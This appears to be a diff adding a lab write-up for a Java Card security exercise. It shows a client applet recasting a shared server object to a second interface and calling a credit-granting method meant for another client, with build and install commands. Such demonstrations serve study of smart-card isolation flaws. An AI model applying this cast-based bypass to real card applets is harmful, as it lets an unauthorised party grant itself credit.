@@ -1,0 +1,67 @@
+
+=========================================================================================================================================
+AIM
+
+The aim is to abuse the Shareable Interface by having the ServerApplet implement two different interfaces, one each for two different ClientApplet. Implement an attack from ClientAppletB so that it can access the method defined in interface meant for access to ClientAppletC.
+
+=========================================================================================================================================
+METHODOLOGY
+
+1.  Implement the following two interfaces in packageA:-
+
+    MSIB extends Shareable	- having method void grantCreditClientB(short amount)
+
+    MSIC extends Shareable	- having method void grantCreditClientC(short amount)
+
+2.  Implement the ServerApplet in packageA with the following method:- 
+
+    public Shareable getShareableInterfaceObject(AID clientAID, byte parameter) {
+
+	/* Return MSIB type to ClientApplet having AID_CLIENT_B */
+        if(clientAID.equals(AID_CLIENT_B, (short)0, (byte) AID_CLIENT_B.length))
+            return (MSIB)this;
+        
+        /* Return MSIC type to ClientApplet having AID_CLIENT_C */
+        else if(clientAID.equals(AID_CLIENT_C, (short)0, (byte) AID_CLIENT_C.length))
+            return (MSIC)this;
+        
+        /* Return null if not AID_CLIENT_B nor AID_CLIENT_C */
+        else
+            return null;
+
+    }
+
+3.  Implement ClientAppletB in packageB with the following method:-
+
+    void grantCredit(short amount){
+
+    	serverAID = JCSystem.lookupAID(AID_SERVER, (short) 0, (byte) AID_SERVER.length);
+
+    	MSIB_SO = (MSIB)(JCSystem.getAppletShareableInterfaceObject(serverAID, (byte) 0));
+
+    	MSIB_SO.grantCreditClientB(amount);
+
+	/* The following code should be prevented */
+	MSIC_SO = (MSIC) JCSystem.getAppletShareableInterfaceObject(serverAID, (byte)0);
+
+	MSIC_SO.grantCreditClientC(amount);
+
+    }      
+
+============================================================================================================================================
+EXECUTION STEPS   
+
+> ant server
+
+> java -jar gp.jar -install Shareable/output/server.cap -d
+
+> ant clientB
+
+> java -jar gp.jar -install Shareable/output/clientB.cap -d
+
+> Communicate with ClientAppletB to access the forbidden interface/method
+
+> Communicate with ServerApplet to verify
+
+============================================================================================================================================
+
